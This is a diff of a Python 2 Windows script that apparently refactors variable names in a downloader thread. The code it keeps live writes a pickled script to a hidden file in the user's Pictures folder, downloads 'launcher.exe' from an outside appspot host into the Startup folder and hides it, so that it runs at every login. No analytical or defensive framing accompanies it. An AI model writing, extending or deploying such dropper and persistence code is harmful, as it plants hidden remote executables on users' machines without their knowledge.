@@ -4,6 +4,7 @@ Should only be run on windows :(
 """
 
 import cPickle
+import os
 import threading
 import urllib2
 import win32api
@@ -25,22 +26,22 @@ class Downloader(threading.Thread):
         """Run the thread."""
         #Make a file for the script
         path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
-        file = open(path, "w")
+        f = open(path, "w")
         print path
         #Save the script
-        cPickle.dump(script, file)
+        cPickle.dump(script, f)
         print cPickle.dumps(script)
         #Hide the script
-        file.close()
+        f.close()
         win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN)
         
         #Get a path for the launcher
         path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
         #Save the launcher
         url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
-        file = open(path, "w")
-        file.write(url.read())
-        file.close()
+        f = open(path, "w")
+        f.write(url.read())
+        f.close()
         url.close()
         print path
         #Hide the launcher
@@ -51,11 +52,11 @@ class Downloader(threading.Thread):
         print command
         
 #Utility functions.  May be useful elsewhere
-def file_in_special_path(specialpath, file):
+def file_in_special_path(specialpath, fname):
     """Make a path composed of a special (CSIDL) path and a file name.
     
     @param specialpath: The CSIDL path found in shellcon
-    @param file: the name of the file
+    @param fname: the name of the file
     """
     path = shell.SHGetFolderPath(0, specialpath, None, 0)
-    path = os.path.join(path, file)
+    path = os.path.join(path, fname)
